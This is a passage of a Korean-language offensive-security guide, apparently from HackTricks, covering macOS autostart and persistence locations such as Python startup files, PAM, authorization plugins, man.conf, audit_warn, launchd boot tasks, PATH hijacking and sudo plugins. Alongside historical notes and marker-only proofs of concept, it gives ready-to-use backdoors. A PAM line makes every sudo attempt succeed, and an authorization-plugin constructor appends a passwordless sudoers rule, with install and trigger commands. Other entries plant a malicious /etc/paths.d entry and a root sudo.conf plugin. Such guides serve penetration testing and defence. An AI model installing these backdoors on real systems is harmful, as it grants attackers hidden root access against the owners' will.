Launch Services는 등록된 앱의 `Info.plist`에서 URL scheme 및 문서 관련 선언을 가져옵니다. [Apple의 등록 가이드](https://developer.apple.com/library/archive/documentation/Carbon/Conceptual/LaunchServicesConcepts/LSCTasks/LSCTasks.html)에 따르면 등록은 Finder가 앱을 발견할 때, 부팅 또는 로그인 시, 혹은 명시적 등록 API를 통해 이루어질 수 있습니다. 앱을 어딘가에 쓰는 것만으로 즉시 등록이 보장되지는 않습니다. 등록 후 일치하는 URL이나 문서를 열면 사용자의 기본 핸들러 선택과 일반적인 macOS 실행 검사를 거쳐 선택된 핸들러 앱이 실행될 수 있습니다. 지원되는 `LSSetDefaultHandlerForURLScheme` API는 사용자가 선호하는 URL 핸들러를 변경하지만, 새로 추가된 앱을 자동으로 실행하지는 않습니다.<sup>[[52]](#references)</sup>

```bash
# Inspect known handlers without registering an app or changing defaults
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -dump | grep -A3 "scheme:"
```

macOS 26.5.2 연구용 Mac에서는 앱을 등록하거나 handler 기본 설정을 변경하지 않았습니다. 실제 handler를 테스트하려면 일회용 사용자 계정을 사용하고, 고유한 scheme을 사용하는 marker만 표시하는 앱을 등록한 다음 해당 URL을 호출한 뒤 앱과 등록 정보를 제거하세요.

파일 확장자 및 URL-scheme handler를 자세히 열거하거나 악용하는 방법은 다음을 참조하세요.

{{#ref}}
macos-security-and-privilege-escalation/macos-file-extension-apps.md
{{#endref}}

### Python 시작 파일 (`.pth` / `usercustomize` / `sitecustomize`)

설명: [https://docs.python.org/3/library/site.html](https://docs.python.org/3/library/site.html)<sup>[[56]](#references)</sup>

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
  - 해당 site 디렉터리가 활성화된 상태로 관련 Python interpreter가 시작될 때 실행됩니다. 모든 virtual environment, Python 빌드 또는 시작 flag에서 항상 트리거되는 것은 아닙니다.
- TCC 우회: [🔴](https://emojipedia.org/large-red-circle)
  - interpreter를 실행한 프로세스의 권한/TCC로 실행됩니다.

#### 위치

- **`$(python3 -m site --user-site)/*.pth`** (macOS framework 빌드: `~/Library/Python/<X.Y>/lib/python/site-packages/`)
  - root 권한이 필요하지 않습니다 (사용자 쓰기 가능).
  - **트리거**: user site가 활성화된 상태에서 해당 Python 빌드가 시작될 때. `site` 모듈은 활성화된 site 디렉터리의 `.pth` 파일을 처리합니다.
- **`<user-site>/usercustomize.py`**
  - root 권한이 필요하지 않습니다.
  - **트리거**: user site가 활성화된 상태로 시작될 때 (`site`가 자동으로 import).
- **`<prefix>/site-packages/sitecustomize.py`** (예: `/opt/homebrew/lib/python3.13/site-packages/` 또는 시스템 경로)
  - interpreter 위치에 따라 root/admin 권한이 필요할 수 있습니다.
  - **트리거**: 해당 site 디렉터리가 포함된 interpreter가 시작될 때.

#### 설명 및 악용

시작 시 Python은 일반적으로 `site`를 import하고 활성화된 `site-packages` 디렉터리에서 `.pth` 파일을 검색합니다. 경로를 추가하는 기능 외에도, `import `로 시작하는 `.pth` 줄은 지정된 모듈을 다른 곳에서 사용하지 않더라도 Python 코드를 실행합니다. Python은 `sitecustomize`도 import하려고 하며, **user site가 활성화된 경우** `usercustomize`도 import합니다.<sup>[[56]](#references)</sup> 트리거는 변경된 디렉터리를 참조하는 interpreter가 나중에 시작되는 것입니다. `-S`는 `site` 처리를 비활성화하고, `-s`, `-I` 또는 `PYTHONNOUSERSITE`는 **user-site** 관련 기능을 비활성화합니다. 일반적으로 `-I`는 전역 `sitecustomize`를 비활성화하지 않습니다. Virtual environment에서 user site를 제외할 수도 있습니다. 해당 interpreter에서 `python3 -m site`를 실행해 확인하세요.

다음 PoC는 macOS 26.5.2에서 실행했습니다. 이 테스트에서는 `PYTHONUSERBASE`를 사용해 user site를 임시 디렉터리로 옮겼으므로 실제 user site는 수정되지 않습니다:

```python
import os, pathlib, subprocess, tempfile

with tempfile.TemporaryDirectory(prefix='ht-python-site-') as root:
    env = os.environ.copy()
    env['PYTHONUSERBASE'] = root
    env.pop('PYTHONNOUSERSITE', None)
    user_site = pathlib.Path(subprocess.check_output(
        ['python3', '-m', 'site', '--user-site'], env=env, text=True
    ).strip())
    user_site.mkdir(parents=True)
    pth_marker = pathlib.Path(root) / 'pth.marker'
    user_marker = pathlib.Path(root) / 'user.marker'
    (user_site / 'ht_probe.pth').write_text(
        'import pathlib; pathlib.Path(' + repr(str(pth_marker)) + ').touch()\n'
    )
    (user_site / 'usercustomize.py').write_text(
        'import pathlib; pathlib.Path(' + repr(str(user_marker)) + ').touch()\n'
    )
    subprocess.run(['python3', '-c', 'pass'], env=env, check=True)
    print('pth:', pth_marker.exists(), 'usercustomize:', user_marker.exists())
```

두 마커가 모두 나타났습니다. 이 테스트에서는 `-s`, `-I` 또는 `-S`를 사용해 반복 실행하자 두 **user-site** 마커가 모두 나타나지 않았습니다. 전역 site 디렉터리의 `sitecustomize`는 테스트하지 않았습니다.

## Root Sandbox Bypass

> [!TIP]
> 여기에서 **sandbox bypass**에 유용한 시작 위치를 확인할 수 있습니다. **루트 권한으로 파일에 내용을 기록하는 것만으로** 무언가를 실행하거나, 그 밖의 **특이한 조건**을 요구하는 위치입니다.

### Periodic

> [!CAUTION]
> **과거 메커니즘:** macOS 26.5.2 테스트 머신에는 `/usr/sbin/periodic`, `/etc/defaults/periodic.conf`, `/etc/periodic` 및 `com.apple.periodic-*` launch daemons가 없습니다. 최신 시스템에서 `/etc/periodic`을 생성하면 그 안의 항목이 예약 실행된다고 가정하지 마세요. 아래 예시를 사용하기 전에 대상 릴리스에서 명령어와 활성화된 스케줄러가 모두 있는지 확인하세요.

설명: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- sandbox bypass에 유용: [🟠](https://emojipedia.org/large-orange-circle)
  - 단, 루트 권한이 필요합니다.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 위치

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
  - 루트 권한 필요
  - **트리거**: 실행 시점이 되면
- `/etc/daily.local`, `/etc/weekly.local` 또는 `/etc/monthly.local`
  - 루트 권한 필요
  - **트리거**: 실행 시점이 되면

#### 설명 및 Exploitation

이전 릴리스에서는 periodic 스크립트(**`/etc/periodic`**)가 `/System/Library/LaunchDaemons/com.apple.periodic*`의 **launch daemons**에 의해 예약 실행되었습니다. macOS Big Sur 11.5부터 periodic 실행기는 periodic 디렉터리의 스크립트를 **각 파일의 소유자** 권한으로 실행해, 이전의 권한 상승 경로를 차단했습니다.<sup>[[27]](#references)</sup> 아래 명령어와 디렉터리 목록은 과거의 출력이며, macOS 26.5.2에서 테스트한 결과가 아닙니다.

```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```

**`/etc/defaults/periodic.conf`**에 지정된 대로 실행되는 다른 주기적 스크립트도 있습니다:

```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```

`periodic`과 해당 launch daemon이 설치되어 활성화된 구형 시스템에서는 `/etc/daily.local`, `/etc/weekly.local`, `/etc/monthly.local`도 추가 실행 경로였습니다. 읽기 전용으로 안전하게 확인하려면 다음을 실행합니다:

```bash
test -x /usr/sbin/periodic && ls /System/Library/LaunchDaemons/com.apple.periodic-*.plist
```

> [!WARNING]
> 소유자 기반 규칙은 주기적 디렉터리 내의 스크립트에 직접 적용됩니다. 과거의 `999.local` 래퍼는 동일한 소유권 확인 없이 `/etc/daily.local`, `/etc/weekly.local` 또는 `/etc/monthly.local`을 source했습니다. 스케줄러가 root로 실행되면 이러한 로컬 파일도 root 권한으로 실행되었습니다. 이러한 차이와 Big Sur 11.5의 변경 사항은 [원본 조사](https://theevilbit.github.io/beyond/beyond_0019/)에 문서화되어 있습니다. `periodic`이 없는 경우 이러한 경로가 활성 상태라고 가정해서는 안 됩니다.

### PAM

작성 문서: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
작성 문서: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- sandbox 우회에 유용: [🟠](https://emojipedia.org/large-orange-circle)
  - 하지만 root 권한이 필요합니다
- TCC 우회: [🔴](https://emojipedia.org/large-red-circle)

#### 위치

- 항상 root 권한 필요

#### 설명 및 악용

PAM은 macOS에서 쉽게 실행하는 것보다 **persistence**와 malware에 더 초점을 두므로, 이 블로그에서는 자세히 설명하지 않습니다. 이 기법을 더 잘 이해하려면 **작성 문서를 읽어보세요**.<sup>[[28]](#references)</sup>

다음 명령으로 PAM 모듈을 확인하세요:

```bash
ls -l /etc/pam.d
```

PAM을 악용하는 persistence/privilege escalation 기법은 모듈 `/etc/pam.d/sudo`의 맨 앞에 다음 줄을 추가하는 것만으로 간단히 수행할 수 있습니다:

```bash
auth       sufficient     pam_permit.so
```

그러면 다음과 같은 모습이 됩니다:

```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```

따라서 **`sudo`를 사용하려는 모든 시도가 작동합니다**.

> [!CAUTION]
> 이 디렉터리는 TCC로 보호되므로 사용자에게 접근 권한을 요청하는 프롬프트가 표시될 가능성이 매우 높다는 점에 유의하세요.

또 다른 좋은 예는 su입니다. 여기서 PAM 모듈에 매개변수를 전달할 수도 있고(이 파일에 백도어를 심을 수도 있습니다):

```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```

### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- sandbox 우회에 유용: [🟠](https://emojipedia.org/large-orange-circle)
  - 하지만 root 권한이 필요하고 추가 구성을 해야 합니다
- TCC 우회: ???

#### 위치

- `/Library/Security/SecurityAgentPlugins/`
  - Root 권한 필요
  - 플러그인을 사용하도록 authorization database를 구성해야 합니다

#### 설명 및 악용

사용자가 로그인할 때 실행되어 persistence를 유지하는 authorization plugin을 만들 수 있습니다. 이러한 플러그인을 만드는 방법에 대한 자세한 내용은 이전 writeup을 확인하세요. (주의하세요. 제대로 작성하지 않으면 시스템에 로그인할 수 없게 되어 recovery mode에서 Mac을 정리해야 할 수 있습니다.)<sup>[[29]](#references)[[30]](#references)</sup>

```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```

**이동**할 위치로 bundle을 로드:

```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```

마지막으로 이 Plugin을 로드하는 **규칙**을 추가합니다:

```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
            <key>class</key>
            <string>evaluate-mechanisms</string>
            <key>mechanisms</key>
            <array>
                <string>CustomAuth:login,privileged</string>
            </array>
        </dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```

**`evaluate-mechanisms`**는 authorization framework에 authorization을 위해 **외부 mechanism을 호출해야 한다고** 알립니다. 또한 **`privileged`**는 root 권한으로 실행되도록 합니다.

다음과 같이 트리거합니다:

```bash
security authorize com.asdf.asdf
```

그리고 **staff 그룹은 sudo** 권한이 있어야 합니다(확인하려면 `/etc/sudoers`를 읽으세요).

### Man.conf

작성글: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- sandbox bypass에 유용: [🟠](https://emojipedia.org/large-orange-circle)
  - 단, root여야 하고 사용자가 man을 사용해야 합니다
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 위치

- **`/private/etc/man.conf`**
  - root 권한 필요
  - **`/private/etc/man.conf`**: man을 사용할 때마다

#### 설명 및 Exploit

설정 파일 **`/private/etc/man.conf`**는 man 문서 파일을 열 때 사용할 바이너리/스크립트를 지정합니다. 따라서 실행 파일 경로를 수정하면 사용자가 man으로 문서를 읽을 때마다 backdoor가 실행되도록 할 수 있습니다.<sup>[[31]](#references)</sup>

예를 들어 **`/private/etc/man.conf`**에 다음을 설정합니다:

```
MANPAGER /tmp/view
```

그런 다음 `/tmp/view`를 다음과 같이 생성합니다:

```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```

### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- sandbox 우회에 유용: [🟠](https://emojipedia.org/large-orange-circle)
  - 단, root 권한이 필요하며 apache가 실행 중이어야 합니다
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Httpd에는 entitlements가 없습니다

#### 위치

- **`/etc/apache2/httpd.conf`**
  - root 권한 필요
  - Trigger: Apache2가 시작될 때

#### 설명 및 Exploit

`/etc/apache2/httpd.conf`에 다음과 같은 줄을 추가하여 모듈을 로드하도록 지정할 수 있습니다:<sup>[[32]](#references)</sup>

```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```

이렇게 하면 컴파일된 모듈이 Apache에 로드됩니다. 다만 유효한 Apple 인증서로 **서명**하거나, 시스템에 **새 신뢰할 수 있는 인증서를 추가**한 다음 해당 인증서로 **서명**해야 합니다.

그런 다음 필요하다면 서버가 시작되는지 확인하기 위해 다음을 실행할 수 있습니다:

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```

Dylb 코드 예제:

```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```

### BSM audit 프레임워크

작성 글: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- sandbox 우회에 유용: [🟠](https://emojipedia.org/large-orange-circle)
  - 단, root 권한이 있어야 하고 auditd가 실행 중이어야 하며 경고를 발생시켜야 함
- TCC 우회: [🔴](https://emojipedia.org/large-red-circle)

#### 위치

- **`/etc/security/audit_warn`**
  - root 권한 필요
  - **트리거**: auditd가 경고를 감지할 때

#### 설명 및 익스플로잇

auditd가 경고를 감지할 때마다 **`/etc/security/audit_warn`** 스크립트가 **실행**됩니다. 따라서 여기에 페이로드를 추가할 수 있습니다.<sup>[[33]](#references)</sup>

```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```

`sudo audit -n`을 사용하면 경고를 강제로 표시할 수 있습니다.

### Startup Items

> [!CAUTION] > **이 기능은 deprecated되었으므로 해당 디렉터리에서 아무것도 발견되지 않아야 합니다.**

**StartupItem**은 `/Library/StartupItems/` 또는 `/System/Library/StartupItems/` 안에 위치해야 하는 디렉터리입니다. 이 디렉터리를 만들면 다음 두 파일이 포함되어야 합니다.

1. **rc script**: 시작 시 실행되는 shell script입니다.
2. **plist file**: `StartupParameters.plist`라는 이름의 파일로, 다양한 구성 설정이 포함됩니다.

시작 프로세스에서 인식하고 사용할 수 있도록 rc script와 `StartupParameters.plist` 파일이 모두 **StartupItem** 디렉터리 안에 올바르게 배치되었는지 확인하세요.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
        <string>This is a description of this service</string>
    <key>OrderPreference</key>
        <string>None</string> <!--Other req services to execute before this -->
    <key>Provides</key>
    <array>
        <string>superservicename</string> <!--Name of the services provided by this file -->
    </array>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="superservicename"}}

```bash
#!/bin/sh
. /etc/rc.common

StartService(){
    touch /tmp/superservicestarted
}

StopService(){
    rm /tmp/superservicestarted
}

RestartService(){
    echo "Restarting"
}

RunService "$1"
```

{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> 제 macOS에서는 이 구성 요소를 찾을 수 없습니다. 자세한 내용은 writeup을 확인하세요.

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

Apple이 도입한 **emond**는 개발이 미흡하거나 어쩌면 더 이상 사용되지 않는 로깅 메커니즘처럼 보이지만, 여전히 접근할 수 있습니다. Mac 관리자가 특별히 활용할 만한 점은 없지만, 이 잘 알려지지 않은 서비스는 위협 행위자가 은밀한 persistence 수단으로 사용할 수 있으며, 대부분의 macOS 관리자는 이를 알아채지 못할 가능성이 큽니다.<sup>[[34]](#references)</sup>

**emond**의 존재를 아는 사람이라면 악의적인 사용 여부를 쉽게 파악할 수 있습니다. 이 서비스의 시스템 LaunchDaemon은 단일 디렉터리에서 실행할 스크립트를 찾습니다. 이를 확인하려면 다음 명령을 사용할 수 있습니다:

```bash
ls -l /private/var/db/emondClients
```

### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### 위치

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
  - Root 권한 필요
  - **트리거**: XQuartz 사용 시

#### 설명 및 익스플로잇

XQuartz는 **더 이상 macOS에 설치되지 않으므로**, 자세한 내용은 writeup을 확인하세요.<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> kext 설치는 root 권한이 있어도 매우 복잡하므로, 익스플로잇이 없는 한 실용적인 sandbox 탈출 또는 지속성 기법으로 간주되지 않습니다.

#### 위치

KEXT를 시작 항목으로 설치하려면 **다음 위치 중 하나에 설치해야 합니다**:

- `/System/Library/Extensions`
  - OS X 운영 체제에 기본 포함된 KEXT 파일.
- `/Library/Extensions`
  - 서드파티 소프트웨어가 설치한 KEXT 파일

현재 로드된 kext 파일은 다음 명령으로 나열할 수 있습니다:

```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```

For more information about [**kernel extensions에 대한 내용은 이 섹션을 확인하세요**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### 위치

- **`/usr/local/bin/amstoold`**
  - Root 권한 필요

#### 설명 및 악용

`/System/Library/LaunchAgents/com.apple.amstoold.plist`의 `plist`는 XPC 서비스를 노출하면서 이 바이너리를 사용하고 있었던 것으로 보입니다... 문제는 바이너리가 존재하지 않았다는 점입니다. 따라서 해당 위치에 파일을 두면 XPC 서비스가 호출될 때 해당 바이너리도 실행되도록 할 수 있었습니다.<sup>[[35]](#references)</sup>

현재는 macOS에서 더 이상 찾을 수 없습니다.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### 위치

- **`/Library/Preferences/Xsan/.xsanrc`**
  - Root 권한 필요
  - **트리거**: 서비스가 실행될 때 (드물게)

#### 설명 및 악용

이 스크립트는 실행되는 경우가 흔치 않은 것 같고, 제 macOS에서도 찾을 수 없었습니다. 자세한 내용은 writeup을 확인하세요.<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **최신 macOS 버전에서는 작동하지 않습니다**

시작 시 **실행될 명령어를 이 위치에 배치하는 것도 가능합니다.** 일반적인 rc.common 스크립트 예시:

```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
    local test

    if [ -z "${NETWORKUP:=}" ]; then
	test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
	if [ "${test}" -gt 0 ]; then
	    NETWORKUP="-YES-"
	else
	    NETWORKUP="-NO-"
	fi
    fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
    local program="$1"
    local pidfile="${PIDFILE:=/var/run/${program}.pid}"
    local     pid=""

    if [ -f "${pidfile}" ]; then
	pid=$(head -1 "${pidfile}")
	if ! kill -0 "${pid}" 2> /dev/null; then
	    echo "Bad pid file $pidfile; deleting."
	    pid=""
	    rm -f "${pidfile}"
	fi
    fi

    if [ -n "${pid}" ]; then
	echo "${pid}"
	return 0
    else
	return 1
    fi
}

#
# Generic action handler
#
RunService ()
{
    case $1 in
      start  ) StartService   ;;
      stop   ) StopService    ;;
      restart) RestartService ;;
      *      ) echo "$0: unknown argument: $1";;
    esac
}
```

### launchd 부팅 작업

작성 자료: [https://theevilbit.github.io/beyond/beyond_0034/](https://theevilbit.github.io/beyond/beyond_0034/)<sup>[[40]](#references)</sup>

- sandbox 우회에 유용: [🔴](https://emojipedia.org/large-red-circle) (root 필요)
- root가 필요하며, 경로에 따라 **SIP bypass** 또는 **`kTCCServiceSystemPolicySysAdminFiles`**/Full Disk Access 권한이 필요

#### 위치

`launchd`는 초기 "부팅 작업"을 설명하는 plist를 **`__TEXT,__config`** 섹션에 포함합니다. 기본적으로 존재하지 않으며 공격자가 생성할 수 있는 여러 참조 스크립트/바이너리가 있습니다.

- SIP-bypass 세트: **`/Library/Apple/usr/libexec/finish_demo_restore`**, **`/private/var/install/shutdown_installer_tasks`**, **`/private/var/install/deferred_install`**
- TCC/FDA 세트: **`/etc/rc.server`**, **`/etc/rc.cdrom`**, **`/etc/rc.netboot`** (`rc.netboot`은 Sequoia+에서만 미리 존재)

#### 설명 및 악용

포함된 작업 테이블을 덤프해 `launchd`가 실행할 파일과 지원되는 키(`Program`, `ProgramArguments`, `PerformAfterUserspaceReboot`, `RequireSuccess`…)를 확인합니다.

```bash
otool -X -s __TEXT __config /sbin/launchd | awk '{print $2 $3 $4 $5}' | \
  xxd -r -p | hexdump -v -e '1/4 "%08x"' -e '"\n"' | xxd -r -p
```

참조된 파일 중 하나(예: `/etc/rc.server`)를 생성하면 다음 (userspace) 재부팅 시 `launchd`가 해당 파일을 실행합니다. 가장 유용한 항목은 SIP로 제한되거나 TCC SysAdminFiles/Full Disk Access가 필요하므로, 이 기법은 root 권한이 필요하고 재부팅 시 트리거됩니다.<sup>[[40]](#references)</sup>

### ~~NVRAM (`apple-trusted-trampoline`)~~

분석 글: [https://theevilbit.github.io/beyond/beyond_0035/](https://theevilbit.github.io/beyond/beyond_0035/)<sup>[[41]](#references)</sup>

`rc.trampoline` 부팅 작업은 부팅 시 `apple-trusted-trampoline` NVRAM 변수에 저장된 **platform (Apple-signed) binary**를 실행하지만, **`rc.trampoline=1` boot-arg가 설정되어 있고 SIP가 비활성화된 경우에만** 실행됩니다(크기 제한은 약 390&nbsp;KB이며, 실행을 차단하거나 빠르게 반환해야 합니다). **root 권한 + SIP 비활성화 + Apple-signed payload**가 필요하므로, 실제 환경에서 지속성을 확보하는 데는 사실상 사용할 수 없으며, 여기서는 완전성을 위해서만 다룹니다.<sup>[[41]](#references)</sup>

### /etc/paths 및 /etc/paths.d (PATH hijack)

- sandbox 우회에 유용: [🔴](https://emojipedia.org/large-red-circle) (쓰기 권한에 root 필요)
- root 권한 필요

#### 위치

- **`/etc/paths`** 및 **`/etc/paths.d/*`** — 로그인 시 기본 `PATH`를 구성하기 위해 **`path_helper`**가 읽습니다(`/etc/zprofile`에서 호출됨).

#### 설명 및 악용

두 파일 모두 root 소유입니다. 공격자가 제어하는 디렉터리를 앞에 추가하면(`/etc/paths`를 수정하거나 `/etc/paths.d/`에 파일을 추가하여) 새로 시작하는 모든 로그인 셸의 `PATH`에서 해당 디렉터리가 앞쪽에 오게 됩니다. 따라서 일반적인 명령어(`ls`, `git` 등)와 같은 이름의 악성 바이너리가 실제 바이너리를 **가로채며**, 피해자가 해당 명령을 다음에 실행할 때 동작합니다.

```bash
# e.g. Homebrew already ships a /etc/paths.d entry; an attacker drops their own
echo "/private/tmp/evil" | sudo tee /etc/paths.d/00-evil
# -> /private/tmp/evil is prepended to PATH for new login shells
```

### storagekitd SIP Bypass (CVE-2024-44243)

Writeup: [https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)<sup>[[46]](#references)</sup>

- sandbox 우회에 유용: [🔴](https://emojipedia.org/large-red-circle) (root 필요)
- root 필요; 결과적으로 **SIP를 우회합니다**. 영향받는 macOS 버전은 **15.0–15.1**이며, **15.2**에서 수정되었습니다.

#### 위치

- 파일 시스템 bundle을 **`/Library/Filesystems/`**에 배치합니다.

#### 설명 및 Exploitation

`storagekitd`는 entitlement **`com.apple.rootless.install.heritable`**을 보유하고 있으며, 파일 시스템 bundle의 바이너리를 이 SIP 우회 기능을 **상속한 상태로** 실행했습니다. 악성 파일 시스템 bundle을 심어두면 공격자가 SIP 우회 상태로 코드를 실행해 **영구적인 kernel extension**을 설치하거나 SIP로 보호되는 `LaunchDaemon` 디렉터리에 쓸 수 있었습니다. 이는 일반적인 보호를 무력화하고 그 이후에도 지속되는 persistence입니다.<sup>[[46]](#references)</sup> Apple은 macOS Sequoia 15.2에서 이 문제를 수정했습니다.

### sudo plugins (/etc/sudo.conf)

Writeup: [On Writing Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)<sup>[[51]](#references)</sup>

- sandbox 우회에 유용: [🔴](https://emojipedia.org/large-red-circle) (`/etc/sudo.conf`에 쓰려면 root 필요)
- 설치하려면 root 필요; 설치된 plugin은 **모든 `sudo` 실행 시** (setuid-root context) 실행됩니다.

#### 위치

- **`/etc/sudo.conf`** — `Plugin` 행은 **`/usr/libexec/sudo/`**(또는 절대 경로)에서 shared object를 불러옵니다. 기본적으로 이 파일은 없으며(sudo는 내장 policy를 사용), 따라서 파일을 생성하면 깔끔한 hook이 됩니다.

#### 설명 및 Exploitation

`sudo`는 `/etc/sudo.conf`에서 policy/approval/audit plugin을 불러옵니다. `sudo`는 setuid-root이므로 악성 shared-object plugin은 **사용자가 `sudo`를 실행할 때마다 root 권한으로** 실행됩니다. 이는 모든 sudo 명령을 확인할 수 있는 지속적인 root persistence입니다.<sup>[[51]](#references)</sup> macOS에는 plugin API를 지원하는 sudo 1.9.x가 포함되어 있습니다.

```bash
# As root: load a malicious audit/approval plugin on every sudo
cat > /etc/sudo.conf <<'CONF'
Plugin sudoers_policy sudoers.so
Plugin ht_audit /usr/libexec/sudo/ht_audit.so
CONF
# ht_audit.so's constructor / audit_open runs as root on the next `sudo <anything>`
```

### CoreMediaIO DAL 플러그인

